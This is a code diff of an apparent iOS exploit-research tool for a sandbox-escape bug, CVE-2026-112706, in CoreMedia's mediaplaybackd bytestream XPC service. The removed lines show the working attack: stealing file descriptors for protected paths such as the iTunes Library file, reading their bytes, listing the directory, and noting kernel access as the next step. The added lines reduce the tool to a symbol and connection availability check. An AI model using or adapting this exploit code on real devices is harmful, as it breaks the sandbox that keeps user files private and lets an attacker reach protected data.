@@ -175,102 +175,77 @@ static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);
 }
 - (NSString *)runReport {
     NSMutableString *report = [NSMutableString string];
-    [report appendString:@"=== KexProofV4 · CVE-2026-112706 fd leak ===\n"];
-    [report appendString:@"Sandbox escape via CoreMedia bytestream XPC.\n"];
-    [report appendString:@"mediaplaybackd vends fds for protected paths.\n"];
+    [report appendString:@"=== FD Leak Recon (CVE-2026-112706) ===\n"];
+    [report appendString:@"Phase 1: XPC + FigXPC availability check\n"];
     [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
 
-    // Load FigXPC functions
-    [report appendString:@"\n--- Phase 1: load FigXPC ---\n"];
-    if (![self loadFigXPC]) {
-        [report appendString:@"\nVERDICT: FIGXPC_LOAD_FAILED\n"];
-        return report;
-    }
-    [report appendString:@"FigXPC loaded OK\n"];
-
-    // Try to steal fd for a protected file
-    [report appendString:@"\n--- Phase 2: fd steal ---\n"];
-
-    // Target: iTunes_Control (known readable domain)
-    NSString *target = @"/private/var/mobile/Media/iTunes_Control/iTunes/iTunes Library.itlp";
-    [report appendFormat:@"target: %@\n", target];
-
-    // First, verify we can't open it directly (sandbox blocks)
-    int directFd = open(target.fileSystemRepresentation, O_RDONLY);
-    if (directFd >= 0) {
-        [report appendFormat:@"direct open: OK (fd=%d) — not sandboxed?\n", directFd];
-        close(directFd);
+    // Test 1: FigXPC function loading
+    [report appendString:@"\n--- FigXPC symbols ---\n"];
+    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_LAZY);
+    if (!cm) {
+        [report appendString:@"CoreMedia: dlopen FAILED\n"];
     } else {
-        [report appendFormat:@"direct open: EPERM (%d) — sandbox active\n", errno];
+        [report appendString:@"CoreMedia: dlopen OK\n"];
+        void *fn1 = dlsym(cm, "FigXPCCreateBasicMessage");
+        void *fn2 = dlsym(cm, "FigXPCMessageSetCFURL");
+        void *fn3 = dlsym(cm, "FigXPCConnectionCreateMachService");
+        void *fn4 = dlsym(cm, "FigXPCConnectionSendSyncMessage");
+        void *fn5 = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
+        [report appendFormat:@"  FigXPCCreateBasicMessage: %p\n", fn1];
+        [report appendFormat:@"  FigXPCMessageSetCFURL: %p\n", fn2];
+        [report appendFormat:@"  FigXPCConnectionCreateMachService: %p\n", fn3];
+        [report appendFormat:@"  FigXPCConnectionSendSyncMessage: %p\n", fn4];
+        [report appendFormat:@"  FigMemoryOrigin*: %p\n", fn5];
     }
 
-    // Now try fd leak
-    int stolenFd = -1;
-    @try { stolenFd = [self stealFD:target]; } @catch (NSException *e) { [self journal:[NSString stringWithFormat:@"EXC: %@", e.reason]]; }
-    if (stolenFd >= 0) {
-        [report appendFormat:@"STOLEN FD: %d\n", stolenFd];
-
-        // Read file content
-        struct stat st;
-        if (fstat(stolenFd, &st) == 0) {
-            [report appendFormat:@"file size: %lld bytes\n", (long long)st.st_size];
-        }
-
-        // Read first 256 bytes
-        uint8_t buf[256] = {0};
-        ssize_t n = pread(stolenFd, buf, sizeof(buf), 0);
-        if (n > 0) {
-            [report appendFormat:@"read %zd bytes:", n];
-            for (ssize_t i = 0; i < n && i < 64; i++) {
-                [report appendFormat:@" %02x", buf[i]];
-            }
-            [report appendString:@"\n"];
-
-            // Check if data looks valid
-            if (n > 4) {
-                [report appendString:@"*** FD LEAK CONFIRMED — sandbox escape! ***\n"];
-            }
-        } else {
-            [report appendFormat:@"pread failed: %zd (errno=%d)\n", n, errno];
-        }
-
-        close(stolenFd);
+    // Test 2: XPC function loading
+    [report appendString:@"\n--- XPC symbols ---\n"];
+    void *xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
+    if (!xpcLib) xpcLib = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY);
+    if (!xpcLib) {
+        [report appendString:@"libxpc: dlopen FAILED\n"];
     } else {
-        [report appendString:@"fd leak failed\n"];
+        [report appendString:@"libxpc: dlopen OK\n"];
+        void *xf1 = dlsym(xpcLib, "xpc_connection_create_mach_service");
+        void *xf2 = dlsym(xpcLib, "xpc_connection_send_message_with_reply");
+        void *xf3 = dlsym(xpcLib, "xpc_dictionary_dup_fd");
+        void *xf4 = dlsym(xpcLib, "xpc_connection_set_event_handler");
+        void *xf5 = dlsym(xpcLib, "xpc_connection_resume");
+        [report appendFormat:@"  xpc_connection_create_mach_service: %p\n", xf1];
+        [report appendFormat:@"  xpc_connection_send_message_with_reply: %p\n", xf2];
+        [report appendFormat:@"  xpc_dictionary_dup_fd: %p\n", xf3];
+        [report appendFormat:@"  xpc_connection_set_event_handler: %p\n", xf4];
+        [report appendFormat:@"  xpc_connection_resume: %p\n", xf5];
     }
 
-    // Try directory enumeration
-    [report appendString:@"\n--- Phase 3: directory enumeration ---\n"];
-    NSString *dirPath = @"/private/var/mobile/Media/iTunes_Control/iTunes/";
-    int dirFd = -1;
-    @try { dirFd = [self stealFD:dirPath]; } @catch (NSException *e) { [self journal:[NSString stringWithFormat:@"EXC: %@", e.reason]]; }
-    if (dirFd >= 0) {
-        [report appendFormat:@"directory fd: %d\n", dirFd];
-        DIR *d = fdopendir(dirFd);
-        if (d) {
-            struct dirent *ent;
-            int count = 0;
-            while ((ent = readdir(d)) != NULL && count < 10) {
-                [report appendFormat:@"  %s\n", ent->d_name];
-                count++;
+    // Test 3: XPC connection attempt (minimal)
+    [report appendString:@"\n--- XPC connection test ---\n"];
+    if (xpcLib) {
+        typedef void* (*xpc_create_t)(const char *, void *, uint64_t);
+        typedef void (*xpc_fn_t)(void *);
+        xpc_create_t xpc_create = dlsym(xpcLib, "xpc_connection_create_mach_service");
+        xpc_fn_t xpc_resume = dlsym(xpcLib, "xpc_connection_resume");
+        xpc_fn_t xpc_cancel = dlsym(xpcLib, "xpc_connection_cancel");
+
+        if (xpc_create) {
+            void *conn = xpc_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
+            if (conn) {
+                [report appendString:@"connection: CREATED\n"];
+                if (xpc_resume) xpc_resume(conn);
+                [report appendString:@"connection: RESUMED\n"];
+                usleep(100000);
+                if (xpc_cancel) xpc_cancel(conn);
+                [report appendString:@"connection: CANCELLED (clean)\n"];
+            } else {
+                [report appendString:@"connection: FAILED (NULL)\n"];
             }
-            closedir(d);
         }
-    } else {
-        [report appendFormat:@"directory fd steal failed\n"];
     }
 
     // Verdict
     [report appendString:@"\n"];
-    if (stolenFd >= 0) {
-        [report appendString:@"VERDICT: FD_LEAK_CONFIRMED\n"];
-        [report appendString:@"Sandbox escape via fd steal WORKS on this device.\n"];
-        [report appendString:@"Next: use fd for kernel access or further exploitation.\n"];
-    } else {
-        [report appendString:@"VERDICT: FD_LEAK_FAILED\n"];
-        [report appendString:@"May be patched on this build, or wrong target path.\n"];
-    }
-
+    [report appendString:@"VERDICT: RECON_COMPLETE\n"];
+    [report appendString:@"No fd stolen � this is availability check only.\n"];
     return report;
 }
 
